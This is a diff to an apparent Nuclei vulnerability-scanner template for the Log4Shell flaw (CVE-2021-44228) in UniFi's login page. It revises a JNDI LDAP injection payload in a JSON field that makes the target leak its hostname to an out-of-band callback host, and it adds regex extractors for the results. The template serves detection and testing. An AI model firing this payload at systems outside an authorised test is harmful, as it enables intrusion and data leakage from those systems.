@@ -21,6 +21,10 @@ info:
     verified: "true"
   tags: cve,cve2021,rce,log4j,ubnt,unifi,oast,jndi,kev
 
+variables:
+  rand1: '{{rand_int(111, 999)}}'
+  rand2: '{{rand_int(111, 999)}}'
+
 http:
   - raw:
       - |
@@ -30,7 +34,7 @@ http:
         Origin: {{RootURL}}
         Referer: {{RootURL}}/manage/account/login?redirect=%2Fmanage
 
-        {"username":"user","password":"pass","remember":"${jndi:ldap://${hostName}.{{interactsh-url}}}","strict":true}
+        {"username":"user","password":"pass","remember":"${jndi:ldap://${:-{{rand1}}}${:-{{rand2}}}.${hostName}.postdata.{{interactsh-url}}}","strict":true}
 
     matchers-condition: and
     matchers:
@@ -42,13 +46,23 @@ http:
       - type: regex
         part: interactsh_request
         regex:
-          - '([a-zA-Z0-9\.\-]+)\.([a-z0-9]+)\.([a-z0-9]+)\.\w+' # Match for extracted ${hostName} variable
+          - '\d{6}\.([a-zA-Z0-9\.\-]+)\.([a-z0-9]+)\.([a-z0-9]+)\.([a-z0-9]+)\.\w+'   # Print extracted ${:-{{rand1}}}${:-{{rand2}}}.${hostName} in output
 
     extractors:
+      - type: kval
+        kval:
+          - interactsh_ip # Print remote interaction IP in output
+
+      - type: regex
+        part: interactsh_request
+        group: 2
+        regex:
+          - '\d{6}\.([a-zA-Z0-9\.\-]+)\.([a-z0-9]+)\.([a-z0-9]+)\.([a-z0-9]+)\.\w+'   # Print injection point in output
+
       - type: regex
         part: interactsh_request
         group: 1
         regex:
-          - '([a-zA-Z0-9\.\-]+)\.([a-z0-9]+)\.([a-z0-9]+)\.\w+'   # Print extracted ${hostName} in output
+          - '\d{6}\.([a-zA-Z0-9\.\-]+)\.([a-z0-9]+)\.([a-z0-9]+)\.([a-z0-9]+)\.\w+'   # Print extracted ${:-{{rand1}}}${:-{{rand2}}}.${hostName} in output
 
 # Enhanced by mp on 2022/06/03
